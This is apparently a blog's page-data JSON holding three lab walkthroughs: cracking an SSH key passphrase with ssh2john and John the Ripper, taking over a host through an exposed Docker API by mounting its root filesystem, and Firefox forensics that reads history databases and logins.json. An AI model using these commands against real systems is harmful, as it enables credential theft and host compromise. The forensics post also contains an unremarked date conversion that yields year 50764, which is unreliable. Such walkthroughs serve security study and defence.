{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/cracking-ssh-private-key-passphrase/","result":{"pageContext":{"post":{"fields":{"slug":"/cracking-ssh-private-key-passphrase"},"excerpt":"root@evilsaint:~# file id_rsa id_rsa: PEM RSA private key\n\nroot@evilsaint:~# whereis ssh2john\nssh2john: /usr/sbin/ssh2john\n\nroot@evilsaint:~…","frontmatter":{"date":"13th August 2021 ","title":"Cracking SSH Private Key Passphrase","description":"","tags":"ssh","posttype":"article"},"body":"\n```\nroot@evilsaint:~# file id_rsa\nid_rsa: PEM RSA private key\n```\n\n\n```\nroot@evilsaint:~# whereis ssh2john\nssh2john: /usr/sbin/ssh2john\n```\n\n\n```\nroot@evilsaint:~# locate ssh2john\n/usr/sbin/ssh2john\n```\n\n```\nroot@evilsaint:~# ssh2john id_rsa > converted_hash\n```\n\n```\nroot@evilsaint:~# john --wordlist=/usr/share/wordlists/rockyou.txt converted_hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA 32/64])\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrevenge2         (id_rsa)\n1g 0:00:00:00 DONE (2021-08-13 21:13) 2.702g/s 636721p/s 636721c/s 636721C/s revenge2\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\n\n\n```\nroot@evilsaint:~# john converted_hash --show\nid_rsa:revenge2\n\n1 password hash cracked, 0 left\n```"},"prev":{"fields":{"slug":"/securely-accessing-remote-docker-host"},"excerpt":"Docker is running out box without the socket set evilsaint@marvel.lab:~# docker ps\nCannot connect to the Docker daemon at unix:///var/run…","frontmatter":{"date":"16th August 2021 ","title":"Securely Accessing Remote Docker Host","description":"The Docker TCP socket by default doesn't support any authentication. and, if the Docker socket is exposed on an external interface, anyone can connect to it and issue docker commands. This can even lead to host takeover if the Docker daemon is running as root.","tags":"docker","posttype":"article"},"body":"Docker is running out box without the socket set\n```\nevilsaint@marvel.lab:~# docker ps\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n\nevilsaint@marvel.lab:~# docker images\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n```\n\n\nNmap Scan showing exposed Docker API port. \n```\nnmap -sSV -p- 192.190.96.3\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 00:34 IST\nNmap scan report for docker-host (192.190.96.3)\nHost is up (0.000015s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n2375/tcp open  docker     Docker 19.03.1 (API 1.40)\n2376/tcp open  tcpwrapped\nMAC Address: 02:42:C0:BE:60:03 (Unknown)\nService Info: OSs: Linux, linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.11 seconds\n````\n\n\nDefine the DOCKER_HOST environment variable to point to this remote TCP socket.\n```\nexport DOCKER_HOST=192.190.96.3:2375\n```\n\nNow we can mount the image to the host volume and do a host breakout if permissions are in place\n```\nevilsaint@marvel.lab:~# docker run -it -v /:/host ubuntu:18.04 bash\nroot@6a01ea2ace07:/# chroot /host\n#\n```\n\n## How can we secure this \n\nI will SSH into the remote host to perform the fix \n\nLet us kill the docker\n```\nps -ef | grep docker\n```\n\n```\nkill <pid>\n```\n\nRestart the docker service\n```\nservice docker start\n```\n\nNow we export the docker host to be accessible over SSH\n```\nroot@localhost:~# export DOCKER_HOST=ssh://root@192.190.96.3\n```"},"next":{"fields":{"slug":"/firefox-browser-forensics"},"excerpt":null,"frontmatter":{"date":"12th August 2021 ","title":"Firefox Browser Forensics","description":"A look at Firefox Browser forensics","tags":"browser","posttype":"article"},"body":"# Firefox: History\n\n\n## SQLite Database\n\n> Inside the places.sqlite database file, there are two tables, moz_places and moz_annos, that store information needed to find downloaded files\n\ncontent-prefs.sqlite: stores site-specific content preferences.\ncookies.sqlite: stores cookie data.\nformhistory.sqlite: stores form input data.\npermissions.sqlite: stores site-specific permissions.\nplaces.sqlite: stores the history of visited sites.\nwebappstore.sqlite: stores Document Object Model (DOM) storage data.\nNote: This list was compiled from multiple sources. Not all files for every system are listed, and some files on this list may not be found on other systems.\n\n\nLocate the Mozilla storage files. \n```\nstudent@attackdefense:/$ cd ~/.mozilla/firefox/zevp8nk2.default/\nstudent@attackdefense:~/.mozilla/firefox/zevp8nk2.default$ ls *.sqlite\ncontent-prefs.sqlite  favicons.sqlite     kinto.sqlite        places.sqlite        storage.sqlite\ncookies.sqlite        formhistory.sqlite  permissions.sqlite  storage-sync.sqlite  webappsstore.sqlite\nstudent@attackdefense:~/.mozilla/firefox/zevp8nk2.default$ sqlite3 places.sqlite\nSQLite version 3.11.0 2016-02-15 17:29:24\nEnter \".help\" for usage hints.\nsqlite>\n```\n\nWe can query all records\n```\nsqlite> select * from moz_places;\n1|https://support.mozilla.org/en-US/products/firefox||gro.allizom.troppus.|0|0|0|137||iZpT3cYccuf2|1|47357795150914||2|https://www.mozilla.org/en-US/firefox/customize/||gro.allizom.www.|0|0|0|137||mkU9pzj7KxEp|1|47357014640010||\n3|https://www.mozilla.org/en-US/contribute/||gro.allizom.www.|0|0|0|137||qFX_kGoubYl7|1|47358034485371||4|https://www.mozilla.org/en-US/about/||gro.allizom.www.|0|0|0|137||gHDaQFcqAxTO|1|47358774953055||\n5|http://www.ubuntu.com/||moc.utnubu.www.|0|0|0|137||1-dNfm-NfyWA|1|125508050257634||6|http://wiki.ubuntu.com/||moc.utnubu.ikiw.|0|0|0|137||4Em1q9WFjljD|1|125511519733047||\n```\n\nWe can use SQL queries to interact\n```\nselect * from moz_places where url like '%releases.ubuntu.com%';\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/af6edeb8-15ff-4712-a559-6416ddd859d6.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">Querying The Database</figcaption></figure>\n\nCounting the unique hosts.\n```\nsqlite> select count(*) from moz_hosts;\n36\nsqlite>\n```\n\nHistory\n```\nselect * from moz_historyvisits where place_id=41;\n```\n\nTable Schema \n```\nsqlite> .schema\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/6fa64eb7-e269-4b8a-99fa-0a7388cac17c.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">Retrieving Schema</figcaption></figure>\n\n\n\n## Logins\n\n```\ncat logins.json | jq\ncat logins.json | python -m json.tool\n```\n\n```\nconsultant@evilsaint:~/.mozilla/firefox/esdp8nk2.default$ cat logins.json | python -m json.tool\n{\n    \"disabledHosts\": [],\n    \"logins\": [\n        {\n            \"encType\": 1,\n            \"encryptedPassword\": \"REDACTED\",\n            \"encryptedUsername\": \"REDACTED\",\n            \"formSubmitURL\": null,\n            \"guid\": \"{eedbf6dd-588b-46c5-b122-1999171667f6}\",\n            \"hostname\": \"chrome://FirefoxAccounts\",\n            \"httpRealm\": \"Firefox Accounts credentials\",\n            \"id\": 1,\n            \"passwordField\": \"\",\n            \"timeCreated\": 1539732575514,\n            \"timeLastUsed\": 1539732575514,\n            \"timePasswordChanged\": 1539732624376,\n            \"timesUsed\": 1,\n            \"usernameField\": \"\"\n        },\n        {\n            \"encType\": 1,\n            \"encryptedPassword\": \"REDACTED\",\n            \"encryptedUsername\": \"REDACTED\",\n            \"formSubmitURL\": \"https://github.com\",\n            \"guid\": \"{ccd2077a-2f06-406a-bf42-d8848243c86f}\",\n            \"hostname\": \"https://github.com\",\n            \"httpRealm\": null,\n            \"id\": 2,\n            \"passwordField\": \"password\",\n            \"timeCreated\": 1539733882060,\n            \"timeLastUsed\": 1539733882060,\n            \"timePasswordChanged\": 1539820282060,\n            \"timesUsed\": 1,\n            \"usernameField\": \"login\"\n        }\n    ],\n    \"nextId\": 5,\n    \"version\": 2\n}\n```\n\n\nTime GitHub Password changed\n```\ndate -d @1539820282060\n# Fri Dec 18 00:07:40 UTC 50764\n```"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}